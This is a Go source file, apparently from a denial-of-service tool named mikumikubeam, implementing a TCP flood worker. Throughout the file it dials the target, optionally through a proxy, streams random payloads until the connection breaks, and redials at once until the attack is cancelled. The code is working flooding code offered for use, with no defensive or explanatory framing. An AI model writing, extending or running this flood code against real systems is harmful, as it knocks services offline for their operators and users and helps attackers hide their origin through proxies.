package tcp

import (
	"context"
	"math/rand"
	"time"

	core "github.com/sammwyy/mikumikubeam/internal/engine"
	"github.com/sammwyy/mikumikubeam/internal/netutil"
)

// floodWorker keeps a TCP connection open and streams data over it.
// When the connection breaks it closes it and dials a fresh one immediately,
// continuing to flood until the attack context is cancelled.
type floodWorker struct{}

func NewFloodWorker() *floodWorker { return &floodWorker{} }

func (w *floodWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
	tn := params.TargetNode
	host := tn.Hostname()
	port := tn.PortNum()
	if host == "" || port <= 0 {
		return nil
	}

	var pptr *core.Proxy
	if p.Host != "" {
		pptr = &p
	}

	size := params.PacketSize
	if size <= 0 {
		size = 512
	}

	// Get buffer from pool, resize if needed.
	bufPtr := bufPool.Get().(*[]byte)
	buf := *bufPtr
	if len(buf) < size {
		buf = make([]byte, size)
	} else {
		buf = buf[:size]
	}
	defer func() {
		*bufPtr = buf[:cap(buf)]
		bufPool.Put(bufPtr)
	}()

	// Loop until the attack is cancelled, redialing whenever the connection dies.
	for ctx.Err() == nil {
		conn, err := netutil.DialedTCPClient(ctx, "tcp", host, port, pptr)
		if err != nil {
			select {
			case <-ctx.Done():
				return nil
			case <-time.After(50 * time.Millisecond):
			}
			continue
		}

		core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)

		// Stream data on the open connection until it breaks or the attack ends.
		for ctx.Err() == nil {
			_ = conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
			if _, err := conn.Write(buf); err != nil {
				break
			}
			rand.Read(buf) // fresh random payload every packet
		}
		conn.Close()
	}
	return nil
}
